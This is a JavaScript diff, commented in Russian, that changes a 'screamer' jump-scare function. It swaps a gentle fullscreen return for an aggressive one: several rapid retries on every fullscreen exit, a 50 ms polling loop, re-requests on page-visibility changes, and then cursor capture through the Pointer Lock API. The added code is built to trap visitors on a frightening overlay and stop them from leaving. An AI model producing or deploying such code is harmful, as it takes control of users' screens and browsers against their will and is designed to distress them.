@@ -1562,22 +1562,42 @@ function triggerScreamer() {
 		});
 	}
 	
-	// Постоянно возвращаем fullscreen если пользователь вышел
-	var returnToFullscreen = function() {
+	// Агрессивное возвращение в fullscreen
+	var forceFullscreen = function() {
 		if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
 			if (requestFullscreen) {
+				// Несколько попыток с задержкой
 				requestFullscreen.call(overlay).catch(function() {});
+				setTimeout(function() { requestFullscreen.call(overlay).catch(function() {}); }, 10);
+				setTimeout(function() { requestFullscreen.call(overlay).catch(function() {}); }, 50);
+				setTimeout(function() { requestFullscreen.call(overlay).catch(function() {}); }, 100);
 			}
 		}
 	};
 	
-	document.addEventListener('fullscreenchange', returnToFullscreen);
-	document.addEventListener('mozfullscreenchange', returnToFullscreen);
-	document.addEventListener('webkitfullscreenchange', returnToFullscreen);
-	document.addEventListener('msfullscreenchange', returnToFullscreen);
+	// Мгновенная реакция на выход из fullscreen
+	document.addEventListener('fullscreenchange', function() {
+		forceFullscreen();
+		setTimeout(forceFullscreen, 0);
+	});
+	document.addEventListener('mozfullscreenchange', function() {
+		forceFullscreen();
+		setTimeout(forceFullscreen, 0);
+	});
+	document.addEventListener('webkitfullscreenchange', function() {
+		forceFullscreen();
+		setTimeout(forceFullscreen, 0);
+	});
+	document.addEventListener('msfullscreenchange', function() {
+		forceFullscreen();
+		setTimeout(forceFullscreen, 0);
+	});
 	
-	// Пытаемся вернуть fullscreen каждые 100мс
-	setInterval(returnToFullscreen, 100);
+	// Постоянная проверка каждые 50мс
+	setInterval(forceFullscreen, 50);
+	
+	// Дополнительные попытки через видимость страницы
+	document.addEventListener('visibilitychange', forceFullscreen);
 	
 	// ЗАХВАТ КУРСОРА (Pointer Lock API)
 	overlay.requestPointerLock = overlay.requestPointerLock || overlay.mozRequestPointerLock || overlay.webkitRequestPointerLock;
